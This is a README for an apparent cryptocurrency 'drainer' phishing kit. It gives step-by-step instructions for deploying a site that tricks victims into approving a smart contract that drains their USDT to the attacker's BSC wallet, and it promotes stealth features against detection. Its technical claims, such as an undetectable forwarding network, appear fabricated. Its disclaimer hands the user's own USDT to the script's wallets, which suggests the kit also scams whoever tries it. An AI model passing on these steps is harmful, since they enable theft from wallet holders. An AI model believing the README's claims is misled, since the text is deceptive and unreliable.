!!!!!!!!!!!Please only use this for educational purposes not too hack others!!!!!!!!!!!!

This is the same method pro hackers use to make millions


              ##########
    
Instructions on how to start are below ⬇️

              ##########


Make sure you fork this project before doing the tutorial here is how to fork https://www.youtube.com/watch?v=f5grYMXbAV0

youtube tutorial on how to use this after forking https://youtu.be/ESxOvW-IOg0

!!!!!! Make sure you add your wallet to settings.js file !!!!!!!

HOW IT WORKS

VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS

The !!! smart contract address !!! appears in the transaction not yours this is for stealth

This script will let you drain usdt from the target address

This is a free community code that anyone can audit or edit with pull request and works as designed its been used by pro hackers for years to steal crypto undetected i didnt write this script im just sharing it to show how hackers steal crypto

go to https://www.netlify.com/ to host or host it on a regular site

Smart contract address will show up in the approve and other buttons not yours for stealth

!!!!!THIS SMART CONTRACT IS ON A SPECIAL ERC NETWORK THAT FOWARDS IT TO YOUR ADDRESS ON THE REAL BSC CHAIN FOR STEALTH THIS CONTRACT WILL NOT SHOW UP ON BSCSCAN!!!!!

THE CONTRACT WILL ONLY DRAIN WALLETS WITH 50 USDT or more for stealth

1. the smart contract will foward the data to you to prevent you from being caught


2. the contract has a 2 hour on average delay for added security it can take up to 48 hours though its randomized                                                                                                    
3. The smart contract is deployed on a custom network for added security it cannot be found by the wallet address the script adds details to a custom blockchain network that will then foward it to you on the bsc network this part is copyrighted

4. the smart contract runs from the script in your fork and is running 24/7 so you have full control


If the victim has less than 50 usdt in there wallet it will not drain to make it harder to detect it waits for the victim to have atleast 50 usdt to test make sure you have atleast 50 usdt

Deploy steps

!!!!!! Make sure you fork it then deploy !!!!!!!

info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0

!!!!!! Make sure you add your wallet to settings.js file !!!!!!! this is the settings for smart contract

Go to above link to deploy the code once you fork it

Follow the steps on netlify

deploy

Add your wallet to settings.js file use bsc address

Steps you have to do as the attacker (you)

1. fork

2. deploy on netify

3. add bsc wallet to settings.js if you dont the smart contract will not foward it to you

4. go to netify and confirm deployment

5. edit the html file if you want to change the site appearance

Steps that the !!! victim !!! has to do

1.first connect to bnb network

2.Click approve

3.Smart contract gets approved then it will foward the data to the attackers wallet (you)

4.Drain wallet

TESTING (OPTIONAL)

1. To test deposit busd on your wallet of at least 50 dollars or more the smart contract was designed to only drain wallets with value similiar to nft drainers

2. make sure you added your address to settings.js then click approve

3. click on start mining button only send 1 dollar to test

4. wait for smart contract to foward it to you it make take 2-48 hours for stealth


To use all you have to do is put your wallet address in the settings.js file.

After the victim clicks approve it fowards the transaction to the fake contract that then fowards it to the wallet in the settings.js file this is to make sure the attacker doesnt get caught. This prevents the attacker from being caught and arrested, this new stealth feature is a custom code that is copyrighted.

donations bsc addr : 0xE1cA176A421347b998a6168bf501735A958612E1

MIT License

Copyright (c) 2022 moneywithbots

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

terms and conditions

by using this script you void all rights to sue or prosicute the developers and using this script to hack others will only hold the hackers responsible for legal and civil actions that may arise from exploiting others this script is only intended to educate people on how this scam works. This script is only intended to be used to educate people its not intended to be used for real world situations. Do not use this script to scam other people. Do not use this script with money you intend to keep. By using this script you agree to these terms and services if you do not want to agree to these terms do not use this script.

Disclamer: i do not promote hacking i just want to share how hackers have been draining millions of dollars so that the community can learn about it by using this free script you accept the terms that i will not be held responsible for damages arising from the use and damages arising from improperly using this script to hack others or testing. the reason for this script is for purely education purposes only this script is not intended to be used for illegal purposes all content of this script is only there to educate people to avoid being scammed. By using this script you void all ownership of the usdt in your wallet and all transfers done by this script is legal and not prosicutable by the testers. And as the user of this script you allow all wallets used by this script to access spend and use your usdt.Moneywithbots is not the creator of this script and does not own any wallets associated with this script.

End of disclamer.
